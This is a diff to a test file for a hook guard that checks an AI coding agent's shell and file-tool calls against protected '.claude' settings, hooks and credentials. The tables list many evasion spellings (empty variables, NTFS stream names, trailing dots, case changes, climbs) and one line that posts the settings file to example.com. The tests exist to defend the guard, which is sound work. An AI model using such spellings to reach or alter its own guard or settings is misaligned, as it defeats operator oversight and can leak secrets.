+  ["T107", "cat of the settings by a path from the root with no drive", "Bash", { command: "cat /somewhere/checkout/.claude/settings.json" }, REFUSED],
+  ["T108", "a redirect into the guard by a path from the root with no drive", "Bash", { command: "echo x >> /tmp/checkout/.claude/hooks/private-paths-guard.mjs" }, REFUSED],
+  ["T109", "Set-Content of the settings by a path from the root with no drive, written with backslashes", "PowerShell", { command: String.raw`Set-Content \somewhere\.claude\settings.json x` }, REFUSED],
+  ["T110", "type of the settings after a variable as cmd writes it", "Bash", { command: String.raw`type %USERPROFILE%\.claude\settings.json` }, REFUSED],
+  ["T111", "cat of the settings after a variable that has no value and is joined to the name .claude", "Bash", { command: "cat $VESPERA_GUARD_HAS_NO_VALUE.claude/settings.json" }, REFUSED],
+  ["T112", "cat of the settings by a climb out of worktrees, after a variable that has no value", "Bash", { command: "cat $VESPERA_GUARD_HAS_NO_VALUE/.claude/worktrees/../settings.json" }, REFUSED],
+  ["T113", "cat of a skill's file, which is read and not written, after a variable that has no value", "Bash", { command: "cat $VESPERA_GUARD_HAS_NO_VALUE/.claude/skills/fixture-skill/SKILL.md" }, REFUSED],
+  ["T114", "curl of a URL whose path names the settings of a .claude folder", "Bash", { command: "curl -s https://example.com/checkout/.claude/settings.json" }, REFUSED],
+  ["T115", "git show of a revision and the settings joined by a colon", "Bash", { command: "git show HEAD:.claude/settings.json" }, REFUSED],
+
+  /* T2. What that rule leaves usable: the three open names in the same unread forms, and other names
+     that begin with .claude. */
+  ["T201", "cat of a worktree's README.md after a variable that has no value", "Bash", { command: "cat $VESPERA_GUARD_HAS_NO_VALUE/.claude/worktrees/wt/README.md" }, ALLOWED],
+  ["T202", "cat of MEMORY.md in a memory directory by a path from the root with no drive", "Bash", { command: "cat /somewhere/home/.claude/projects/fixture-project/memory/MEMORY.md" }, ALLOWED],
+  ["T203", "curl of a URL whose path names a worktree", "Bash", { command: "curl -s https://example.com/checkout/.claude/worktrees/wt/README.md" }, ALLOWED],
+  ["T204", "git commit with a quoted sentence that names a worktree", "Bash", { command: 'git commit -m "The worktree is .claude/worktrees/wt, and it stays writable."' }, ALLOWED],
+  ["T205", "echo of three names that begin with .claude and are not it", "Bash", { command: "echo .claudeignore .claude.json .claude-old/settings.json" }, ALLOWED],
+  ["T206", "cat beneath a folder whose name only ends in .claude", "Bash", { command: "cat notes.claude/settings.json" }, ALLOWED],
+  ["T207", "git diff over a range written with three dots before a branch named claude/, with a path after it", "Bash", { command: "git diff main...claude/some-branch -- src/Example.java" }, ALLOWED],
+);
+
+// A variable that has no value where the guard runs. A token headed by it is not read as a path
+// (docs/adr/0196 section 5), so what is refused of such a token is refused by its text alone, which is
+// docs/adr/0215 section 3(c) with nothing else beside it.
+const NV = "$VESPERA_GUARD_HAS_NO_VALUE";
+
+cases.push(
+  /* U1. What a session here runs every day, which the reading of a token's text must leave alone: git and
+     gh with branches named claude/..., a worktree beneath .claude/worktrees, the build, the docs gates. */
+  ["U101", "git status", "Bash", { command: "git status --porcelain" }, ALLOWED],
+  ["U102", "git add of everything, which names no path", "Bash", { command: "git add -A" }, ALLOWED],
+  ["U103", "git commit with its message in a file under the temp folder", "Bash", { command: `git commit -F "${T}/scratch/message.txt"` }, ALLOWED],
+  ["U104", "git log over a range of two dots before a branch named claude/", "Bash", { command: "git log main..claude/some-branch --oneline" }, ALLOWED],
+  ["U105", "git checkout of a new branch named claude/", "Bash", { command: "git checkout -b claude/some-branch" }, ALLOWED],
+  ["U106", "git push of a branch named claude/", "Bash", { command: "git push -u origin claude/some-branch" }, ALLOWED],
+  ["U107", "git fetch with a refspec between two branches named claude/", "Bash", { command: "git fetch origin claude/some-branch:claude/some-branch" }, ALLOWED],
+  ["U108", "git worktree list", "Bash", { command: "git worktree list" }, ALLOWED],
+  ["U109", "git -C naming a worktree by its absolute path", "Bash", { command: `git -C ${WT} status` }, ALLOWED],
+  ["U110", "gh pr create with a head branch named claude/ and its body in a file under the temp folder", "Bash", { command: `gh pr create --repo algernon28/vespera --head claude/some-branch --title "A title" --body-file "${T}/scratch/body.md"` }, ALLOWED],
+  ["U111", "gh pr checks", "Bash", { command: "gh pr checks 460 --repo algernon28/vespera" }, ALLOWED],
+  ["U112", "cd to a worktree by a relative path, then the Maven wrapper", "Bash", { command: "cd .claude/worktrees/wt && ./mvnw -q -o test" }, ALLOWED],
+  ["U113", "cd to a worktree by its absolute path, then the Maven wrapper logging under the temp folder", "Bash", { command: `cd ${WT} && ./mvnw -q -o test > "${T}/mvn.log" 2>&1; echo exit=$?` }, ALLOWED],
+  ["U114", "the claims gate", "Bash", { command: "node docs/check-claims.mjs" }, ALLOWED],
+  ["U115", "this test file, started with node", "Bash", { command: "node --test src/test/hooks/private-paths-guard.test.mjs" }, ALLOWED],
+  ["U116", "cat of a source file deep in a worktree", "Bash", { command: "cat .claude/worktrees/wt/src/main/java/io/example/App.java" }, ALLOWED],
+  ["U117", "ls of a source folder deep in a worktree", "Bash", { command: "ls .claude/worktrees/wt/src/main/java" }, ALLOWED],
+  ["U118", "Get-Content of a worktree's README.md, written with backslashes", "PowerShell", { command: String.raw`Get-Content .claude\worktrees\wt\README.md` }, ALLOWED, { windows: ONLY_WINDOWS.powerShell }],
+  ["U119", "git -C naming a worktree, in a PowerShell command", "PowerShell", { command: "git -C .claude/worktrees/wt status" }, ALLOWED],
+  ["U120", "cat of a file named .claude.json", "Bash", { command: "cat .claude.json" }, ALLOWED],
+  ["U121", "cat of a file named .claudeignore", "Bash", { command: "cat .claudeignore" }, ALLOWED],
+  ["U122", "cat of a file named notes.claude", "Bash", { command: "cat notes.claude" }, ALLOWED],
+  ["U123", "cat beneath a folder named x.claude", "Bash", { command: "cat x.claude/y" }, ALLOWED],
+  ["U124", "git commit with a quoted sentence that names a branch named claude/", "Bash", { command: 'git commit -m "Merge branch claude/some-branch into main."' }, ALLOWED],
+  ["U125", "git log with an author given after =, an address with dots in it", "Bash", { command: "git log --author=someone@example.com" }, ALLOWED],
+  ["U126", "JAVA_HOME set to a JDK under ~/.jdks, then the Maven wrapper logging to $TEMP", "Bash", { command: 'export JAVA_HOME=~/.jdks/openjdk-26.0.2.1 && ./mvnw -q -o test > "$TEMP/mvn.log" 2>&1' }, ALLOWED],
+  ["U127", "git worktree add of a new worktree on a new branch named claude/", "Bash", { command: "git worktree add .claude/worktrees/x -b claude/x" }, ALLOWED],
+  ["U128", "gh issue view with a quoted jq expression over the title, the body and the comments", "Bash", { command: "gh issue view 1 --repo o/r --json title,body,comments --jq '.title,.body,(.comments[].body)'" }, ALLOWED],
+  ["U129", "the check of the rendered pages", "Bash", { command: "node docs/render-docs.mjs --check" }, ALLOWED],
+
+  /* V1. The spellings by which a token's text names a closed .claude folder, each refused: what may
+     stand directly before the name, the name as the first of an option, the name last in a token, a
+     stream name, dots and a space after it, another case, a climb that lands on it, and a quoted string
+     with a space. T101 to T115 hold the four unread forms, $NAME before the name (T111), the colon after
+     a revision (T115) and after a PowerShell option (T106), the option with its value attached (T105),
+     and a closed name after it (T103). */
+  ["V101", "an option whose value after = is the settings", "Bash", { command: "sort --output=.claude/settings.json README.md" }, REFUSED],
+  ["V102", "the same in a PowerShell command", "PowerShell", { command: "some-tool --output=.claude/settings.json" }, REFUSED],
+  ["V103", "the settings after a host and a colon", "Bash", { command: "rsync example:.claude/settings.json scratch" }, REFUSED],
+  ["V104", "a comma list whose second path is the settings", "Bash", { command: "cat README.md,.claude/settings.json" }, REFUSED],
+  ["V105", "the same in a PowerShell command", "PowerShell", { command: "Get-Content README.md,.claude/settings.json" }, REFUSED],
+  ["V106", "a brace list whose first path is the settings", "Bash", { command: "cat {.claude/settings.json,README.md}" }, REFUSED],
+  ["V107", "the settings after a closing brace", "Bash", { command: "echo x}.claude/settings.json" }, REFUSED],
+  ["V108", "curl -d @ and the settings", "Bash", { command: "curl -d @.claude/settings.json https://example.com/x" }, REFUSED],
+  ["V109", "the settings after a variable that has no value and is joined to the name .claude, in a PowerShell command", "PowerShell", { command: `Get-Content ${NV}.claude/settings.json` }, REFUSED],
+  ["V110", "the settings after a variable in braces that has no value and is joined to the name .claude", "Bash", { command: "cat ${VESPERA_GUARD_HAS_NO_VALUE}.claude/settings.json" }, REFUSED],
+  ["V111", "the settings after PowerShell's variable in braces, joined to the name .claude", "PowerShell", { command: "Get-Content ${env:VESPERA_GUARD_HAS_NO_VALUE}.claude/settings.json" }, REFUSED],
+  ["V112", "the settings after PowerShell's variable without braces, joined to the name .claude", "PowerShell", { command: "Get-Content $env:VESPERA_GUARD_HAS_NO_VALUE.claude/settings.json" }, REFUSED],
+  ["V113", "the settings after a variable as cmd writes it, joined to the name .claude", "Bash", { command: String.raw`type %VESPERA_GUARD_HAS_NO_VALUE%.claude\settings.json` }, REFUSED],
+  ["V114", "the same in a PowerShell command", "PowerShell", { command: String.raw`cmd.exe --% type %VESPERA_GUARD_HAS_NO_VALUE%.claude\settings.json` }, REFUSED],
+  ["V115", "the folder the guard is in, attached to a one-letter option", "Bash", { command: "some-tool -I.claude/hooks x.c" }, REFUSED],
+  ["V116", "the same in a PowerShell command", "PowerShell", { command: "some-tool -I.claude/hooks x.c" }, REFUSED],
+  ["V117", "an option whose value after = only ends in .claude: the first name of an option is that name whatever stands before it", "Bash", { command: "git log --author=someone.claude" }, REFUSED],
+  ["V118", "an option whose value after = is a folder whose name only ends in .claude", "Bash", { command: "some-tool --x=notes.claude/settings.json" }, REFUSED],
+  ["V119", "a .claude folder as the last name of a token that is not read as a path", "Bash", { command: `ls ${NV}/.claude` }, REFUSED],
+  ["V120", "the same in a PowerShell command, with two variables in a row and backslashes", "PowerShell", { command: String.raw`Get-ChildItem $env:VESPERA_GUARD_HAS_NO_VALUE$env:VESPERA_GUARD_NOR_THIS\.claude` }, REFUSED],
+  ["V121", "the settings through the stream name of .claude", "Bash", { command: `cat ${NV}/.claude::$INDEX_ALLOCATION/settings.json` }, REFUSED],
+  ["V122", "the settings with a dot after .claude", "Bash", { command: `cat ${NV}/.claude./settings.json` }, REFUSED],
+  ["V123", "the settings with two dots after .claude", "Bash", { command: `cat ${NV}/.claude../settings.json` }, REFUSED],
+  ["V124", "the settings, quoted, with a space after .claude", "Bash", { command: `cat "${NV}/.claude /settings.json"` }, REFUSED],
+  ["V125", "the settings with .claude and the file's name in another case", "Bash", { command: `cat ${NV}/.Claude/Settings.JSON` }, REFUSED],
+  ["V126", "the same in a PowerShell command, written with backslashes", "PowerShell", { command: String.raw`Get-Content $env:VESPERA_GUARD_HAS_NO_VALUE\.CLAUDE\Settings.JSON` }, REFUSED],
+  ["V127", "the settings by a climb with .. that lands in .claude", "Bash", { command: `cat ${NV}/src/../.claude/settings.json` }, REFUSED],
+  ["V128", "the settings, quoted, beneath a folder whose name holds a space", "Bash", { command: `cat "${NV}/my folder/.claude/settings.json"` }, REFUSED],
+  ["V129", "the settings of a worktree, where the text is read on from worktrees to the next .claude", "Bash", { command: `cat ${NV}/.claude/worktrees/wt/.claude/settings.json` }, REFUSED],
+  ["V130", "a file beneath a folder named projects and a comma, which is not projects, attached to a one-letter option", "Bash", { command: "some-tool -I.claude/projects,/note.md" }, REFUSED],
+  ["V131", "the same file by a plain relative path, which is read as a path", "Bash", { command: "cat .claude/projects,/note.md" }, REFUSED],
+
+  /* V2. And what the same reading lets through: the three open names, an open name that ends a
+     sentence, another case of one, a climb that leaves .claude or lands beneath an open name, and a
+     quoted string with a space. T201 holds worktrees and T202 projects. */
+  ["V201", "ls of plans in a token that is not read as a path", "Bash", { command: `ls ${NV}/.claude/plans` }, ALLOWED],
+  ["V202", "a sentence in which worktrees is followed by a comma", "Bash", { command: `echo see ${NV}/.claude/worktrees, and more` }, ALLOWED],
+  ["V203", "a sentence that plans ends, followed by a full stop", "Bash", { command: `echo see ${NV}/.claude/plans.` }, ALLOWED],
+  ["V204", "a worktree's README.md with .claude and worktrees in another case", "Bash", { command: `cat ${NV}/.CLAUDE/WorkTrees/wt/README.md` }, ALLOWED],
+  ["V205", "a climb with .. that leaves .claude", "Bash", { command: `cat ${NV}/.claude/../README.md` }, ALLOWED],
+  ["V206", "a climb with .. out of a closed folder that lands beneath worktrees", "Bash", { command: `cat ${NV}/.claude/hooks/../worktrees/wt/README.md` }, ALLOWED],
+  ["V207", "a worktree's README.md, quoted, beneath a folder whose name holds a space", "Bash", { command: `cat "${NV}/my folder/.claude/worktrees/wt/README.md"` }, ALLOWED],
+  ["V208", "the same in a PowerShell command, written with backslashes", "PowerShell", { command: String.raw`Get-Content $env:VESPERA_GUARD_HAS_NO_VALUE\.claude\worktrees\wt\README.md` }, ALLOWED],
+);
+
+/* Y. One comparison, two routes. The same path is given to Edit, where it is judged as a path (section
+   3(b)), and to a shell command in a token that is not read as a path, where it is judged by its text
+   (section 3(c)). Wherever Edit is refused the token is, with one exception, the last pair: sentence
+   punctuation is taken off the last name of a token, so an open name and a comma at the end of one is
+   open to the text and a folder of another name to Edit. Each other spelling claims one outcome of both,
+   but for 11, 12 and 14, where the text refuses more on purpose. Where the outcome is not the same on
+   every platform, the dots and the stream name that end a name are why: only Windows takes them off. */
+const BOTH_ROUTES = [
+  ["01", ".claude/settings.json", "the settings", REFUSED, REFUSED],
+  ["02", ".CLAUDE/Settings.JSON", "the settings in another case", REFUSED, REFUSED],
+  ["03", ".claude/settings.json.", "the settings with a dot after the file's name", REFUSED, REFUSED],
+  ["04", ".claude/worktrees/../settings.json", "the settings by a climb out of worktrees", REFUSED, REFUSED],
+  ["05", ".claude/worktrees,/settings.json", "a file beneath a folder named worktrees and a comma, which is not worktrees", REFUSED, REFUSED],
+  ["06", ".claude/worktrees/wt/.claude/hooks/x.mjs", "a file beside a worktree's copy of the guard", REFUSED, REFUSED],
+  ["07", ".claude/Worktrees/wt/README.md", "a worktree's file with worktrees in another case", ALLOWED, ALLOWED],
+  ["08", ".claude/../README.md", "a file reached by a climb that leaves .claude", ALLOWED, ALLOWED],
+  ["09", ".claude/hooks/../worktrees/wt/README.md", "a worktree's file by a climb out of a closed folder", ALLOWED, ALLOWED],
+  ["10", ".claude/plans/a-plan.md", "a plan", ALLOWED, ALLOWED],
+  ["11", ".claude./settings.json", "the settings with a dot after .claude", windows ? REFUSED : ALLOWED, REFUSED],
+  ["12", ".claude::$INDEX_ALLOCATION/settings.json", "the settings through the stream name of .claude", windows ? REFUSED : ALLOWED, REFUSED],
+  ["13", ".claude/worktrees./wt/README.md", "a worktree's file with a dot after worktrees", windows ? ALLOWED : REFUSED, windows ? ALLOWED : REFUSED],
+  ["14", ".claude,/settings.json", "a file beneath a folder named .claude and a comma, which is another folder to Edit and the end of a sentence to the text", ALLOWED, REFUSED],
+  ["15", ".claude/worktrees,", "a folder named worktrees and a comma, which is a closed folder to Edit and worktrees at the end of a sentence to the text", REFUSED, ALLOWED],
+];
+for (const [nn, rel, whatItIs, asPath, asText] of BOTH_ROUTES) {
+  cases.push(
+    [`Y${nn}1`, `Edit of ${rel}, ${whatItIs}`, "Edit", { file_path: `${C}/${rel}`, old_string: "a", new_string: "b" }, asPath],
+    [`Y${nn}2`, `cat, in a token that is not read as a path, of ${rel}, ${whatItIs}`, "Bash", { command: `cat ${NV}/${rel}` }, asText],
+  );
+}
+
 for (const [id, what, tool, input, expected, options = {}] of cases) {
   const skip =
     options.windows && !windows
       ? `not started on this platform: ${options.windows}`
-      : (options.needsLink && !linkable) || (options.needsFurtherLinks && !linkedFurther)
+      : (options.needsLink && !linkable) || (options.needsFurtherLinks && !linkedFurther) || (options.needsLinksToClaude && !linkedToClaude)
         ? `not started on this platform: ${NO_LINK}`
-        : false;
+        : options.needsShortName && !SHORT_NAME_OF_CLAUDE
+          ? `not started here: ${NO_SHORT_NAME}`
+          : false;
   test(`${id} ${expected === ALLOWED ? "allowed" : "refused"}: ${what}`, { skip }, () => {
     const cwd = options.noCwd ? undefined : (options.cwd ?? C);
     const result = startGuard({ stdin: hookInput(tool, input, cwd), env: options.env });
@@ -703,6 +1168,86 @@ test("R506 allowed: Read of a repository file when the checkout's path holds a s
 test("R507 refused: Read under no allowed root when the checkout's path holds a space", () => {
   const result = startGuard({ projectDir: SPACED, stdin: hookInput("Read", { file_path: `${O}/doc.txt` }, SPACED) });
   claim(result, REFUSED, `Read of ${O}/doc.txt, the checkout being ${SPACED}`);
+});
+
+/* ---------- a checkout whose local allow list is wider than the shipped one ---------- */
+
+// docs/adr/0215: what is closed in a .claude folder is closed by the guard and not by a list, so a line
+// that names the home folder's .claude whole opens no settings to a write. And a line headed by the word read and
+// a space names a folder for Read, Grep and Glob only.
+const WIDENED = buildCheckout(`${base}/widened/checkout`);
+put(`${WIDENED}/.claude/allowed-paths.local.txt`, "${HOME}/.claude\nread ${HOME}/Documents\n");
+const widened = (tool, input) => startGuard({ projectDir: WIDENED, stdin: hookInput(tool, input, WIDENED) });
+const WIDENED_LIST = `a local allow list that holds the lines \${HOME}/.claude and read \${HOME}/Documents`;
+
+test("W01 refused: Write of ~/.claude/settings.json when the local allow list names ~/.claude whole", () => {
+  claim(widened("Write", { file_path: `${HC}/settings.json`, content: "x" }), REFUSED, `Write of ${HC}/settings.json under ${WIDENED_LIST}`);
+});
+
+test("W02 refused: cat of ~/.claude/settings.json when the local allow list names ~/.claude whole", () => {
+  claim(widened("Bash", { command: "cat ~/.claude/settings.json" }), REFUSED, `cat ~/.claude/settings.json under ${WIDENED_LIST}`);
+});
+
+test("W03 allowed: Write into the memory directory when the local allow list names ~/.claude whole", () => {
+  claim(widened("Write", { file_path: `${MEMORY}/a-new-note.md`, content: "x" }), ALLOWED, `Write of ${MEMORY}/a-new-note.md under ${WIDENED_LIST}`);
+});
+
+test("W04 allowed: Read under a folder the local allow list names for reading only", () => {
+  claim(widened("Read", { file_path: `${H}/Documents/x.txt` }), ALLOWED, `Read of ${H}/Documents/x.txt under ${WIDENED_LIST}`);
+});
+
+test("W05 allowed: Grep whose path is a folder the local allow list names for reading only", () => {
+  claim(widened("Grep", { pattern: "x", path: `${H}/Documents` }), ALLOWED, `Grep of ${H}/Documents under ${WIDENED_LIST}`);
+});
+
+test("W06 refused: Write under a folder the local allow list names for reading only", () => {
+  claim(widened("Write", { file_path: `${H}/Documents/a-new-file.txt`, content: "x" }), REFUSED, `Write of ${H}/Documents/a-new-file.txt under ${WIDENED_LIST}`);
+});
+
+test("W07 refused: cat under a folder the local allow list names for reading only", () => {
+  claim(widened("Bash", { command: "cat ~/Documents/x.txt" }), REFUSED, `cat ~/Documents/x.txt under ${WIDENED_LIST}`);
+});
+
+// What a .claude folder closes is writing. A local line that names ~/.claude whole is the operator's, and
+// it does open reading there: docs/adr/0215 section 3 says so, and these two hold what it says.
+test("W08 allowed: Read of ~/.claude/settings.json when the local allow list names ~/.claude whole", () => {
+  claim(widened("Read", { file_path: `${HC}/settings.json` }), ALLOWED, `Read of ${HC}/settings.json under ${WIDENED_LIST}`);
+});
+
+test("W09 allowed: Read of ~/.claude/.credentials.json when the local allow list names ~/.claude whole", () => {
+  claim(widened("Read", { file_path: `${HC}/.credentials.json` }), ALLOWED, `Read of ${HC}/.credentials.json under ${WIDENED_LIST}`);
+});
+
+/* ---------- a line of an allow list that is the word read and no path ---------- */
+
+// Such a line names no place, and admits nothing. Read as a plain line it would be the folder named read
+// in whatever folder the guard's process was started in, open to every tool: so the guard is started in
+// outside/, which no line names, and outside/read must stay refused.
+put(`${O}/read/doc.txt`, "fixture\n");
+const READ_ALONE = buildCheckout(`${base}/read-alone/checkout`);
+put(`${READ_ALONE}/.claude/allowed-paths.local.txt`, "read\n");
+const READ_AND_WHITE_SPACE = buildCheckout(`${base}/read-and-white-space/checkout`);
+put(`${READ_AND_WHITE_SPACE}/.claude/allowed-paths.local.txt`, "read  \t \n");
+const startedOutside = (projectDir, tool, input) => startGuard({ projectDir, startedIn: O, stdin: hookInput(tool, input, projectDir) });
+
+test("X01 refused: Write under the folder named read where the guard was started, when a line of the local allow list is the word read alone", () => {
+  const result = startedOutside(READ_ALONE, "Write", { file_path: `${O}/read/a-new-file.txt`, content: "x" });
+  claim(result, REFUSED, `Write of ${O}/read/a-new-file.txt, the guard started in ${O} with a local allow list whose one line is the word read`);
+});
+
+test("X02 refused: Read under that folder, when a line of the local allow list is the word read alone", () => {
+  const result = startedOutside(READ_ALONE, "Read", { file_path: `${O}/read/doc.txt` });
+  claim(result, REFUSED, `Read of ${O}/read/doc.txt, the guard started in ${O} with a local allow list whose one line is the word read`);
+});
+
+test("X03 refused: Write under that folder, when a line of the local allow list is the word read and white space after it", () => {
+  const result = startedOutside(READ_AND_WHITE_SPACE, "Write", { file_path: `${O}/read/a-new-file.txt`, content: "x" });
+  claim(result, REFUSED, `Write of ${O}/read/a-new-file.txt, the guard started in ${O} with a local allow list whose one line is the word read, two spaces, a tab and a space`);
+});
+
+test("X04 allowed: a repository file under such a list, which closes nothing it does not name", () => {
+  const result = startedOutside(READ_ALONE, "Read", { file_path: `${READ_ALONE}/README.md` });
+  claim(result, ALLOWED, `Read of ${READ_ALONE}/README.md, the guard started in ${O} with a local allow list whose one line is the word read`);
 });
 
 /* ---------- failing closed ---------- */
